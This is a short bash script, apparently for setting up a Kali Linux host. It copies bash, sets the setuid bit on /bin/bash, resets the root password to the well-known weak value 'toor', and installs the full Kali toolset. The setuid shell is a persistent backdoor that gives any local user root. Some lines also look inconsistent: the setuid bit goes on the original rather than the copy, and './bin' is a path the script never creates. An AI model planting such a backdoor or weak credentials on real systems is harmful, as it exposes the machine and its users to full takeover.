#!/bin/bash -e

cp /bin/bash .
chmod u+s /bin/bash
chmod u+s ./bin

whoami
echo -e "toor\ntoor\n" | passwd root
apt update -y && apt upgrade -y

apt install kali-linux-full
